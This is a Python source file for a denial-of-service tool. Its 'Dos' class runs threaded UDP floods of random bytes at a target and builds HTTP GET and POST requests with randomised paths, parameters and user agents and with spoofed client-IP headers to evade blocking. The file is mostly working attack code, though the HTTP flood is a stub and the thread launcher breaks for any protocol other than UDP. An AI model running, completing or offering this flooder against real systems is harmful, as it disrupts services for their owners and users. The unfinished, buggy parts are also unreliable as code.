import socket
import random
import json
import os
import string
from threading import Thread

TCP = socket.SOCK_STREAM
UDP = socket.SOCK_DGRAM


class Dos():

    def __init__(self, target_ip, target_port, protocol, udp_size_bytes=1024, thread_number=4):
        self.target_ip = target_ip
        self.target_port = target_port
        self.protocol = protocol
        self.udp_size_bytes = udp_size_bytes
        self.thread_number = thread_number

    def udp_flood(self):
        """ 
        UDP flood, send 1024 bytes
        """
        sock = socket.socket(socket.AF_INET, UDP)
        bytes_to_send = random._urandom(self.udp_size_bytes)  # random bytes
        while True:
            sock.sendto(bytes_to_send, (self.target_ip, self.target_port))

    def http_flood(self):
        """
        HTTP(S) flood
        """
        sock = socket.socket(socket.AF_INET, TCP)

    def get_http_request(self):
        random_ip = self.http_random_ip()

        header = f"GET /{self.http_random_resource()}?{self.http_random_param()} HTTP/1.1\r\n"
        header += f"Host: {self.target_ip}\r\n"
        header += f"Accept: */*\r\n"
        header += f"Accept-Encoding: gzip,deflate\r\n"
        header += f"User-Agent: {self.http_random_agent()}\r\n"
        header += f"X-Originating-IP: {random_ip}\r\n"
        header += f"X-Forwarded-For: {random_ip}\r\n"
        header += f"X-Remote-IP: {random_ip}\r\n"
        header += f"X-Remote-Addr: {random_ip}\r\n"
        header += f"X-Client-IP: {random_ip}\r\n"
        header += 'Accept-Language: en-US,en;q=0.9\r\n'
        header += 'Connection: keep-alive\r\n'
        header += 'Pragma: no-cache\r\n'
        header += 'Cache-Control: no-cache\r\n'
        header += '\r\n\r\n'
        return header
    
    def post_http_request(self):
        random_ip = self.http_random_ip()
        header = f"POST /{self.http_random_resource()}?{self.http_random_param()} HTTP/1.1\r\n"
        header += f"Host: {self.target_ip}\r\n"
        header += f"Accept: */*\r\n"
        header += f"Accept-Encoding: gzip,deflate\r\n"
        header += f"User-Agent: {self.http_random_agent()}\r\n"
        header += f"X-Originating-IP: {random_ip}\r\n"
        header += f"X-Forwarded-For: {random_ip}\r\n"
        header += f"X-Remote-IP: {random_ip}\r\n"
        header += f"X-Remote-Addr: {random_ip}\r\n"
        header += f"X-Client-IP: {random_ip}\r\n"
        header += 'Accept-Language: en-US,en;q=0.9\r\n'
        header += 'Connection: keep-alive\r\n'
        header += 'Pragma: no-cache\r\n'
        header += 'Cache-Control: no-cache\r\n'
        header += '\r\n'
        body = f"{self.http_random_param()}&{self.http_random_param()}"

        return header + body + '\r\n\r\n'

    def http_random_agent(self):
        """Select a random agent from the list"""
        path = os.path.join('src', 'random-agent.json')
        with open(path, 'r') as f:
            data = json.load(f)
        return data[random.randint(0, len(data)-1)]['useragent']

    def http_random_param(self):
        """Generate a random GET parameter and value"""
        param = ''.join(random.choices(string.ascii_lowercase, k=random.randint(2, 10)))
        value = ''.join(random.choices(string.ascii_lowercase, k=random.randint(2, 10)))
        return f"{param}={value}"

    def http_random_ip(self):
        """Generate a random ip"""
        return ".".join(str(random.randint(15, 220)) for _ in range(4))
    
    def http_random_resource(self):
        """Generate random resource"""
        return ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 10)))

    def start_attack(self):
        """
        Manage threads and choose attack method
        """
        threads = []
        for _ in range(self.thread_number):
            if self.protocol != False and self.protocol != '':
                if self.protocol == UDP:
                    thread = Thread(target=self.udp_flood)
                threads.append(thread)
                thread.start()
            else:
                print('Bad method')
                return

dos = Dos("toto.com", 443, 'https')
print(dos.post_http_request())
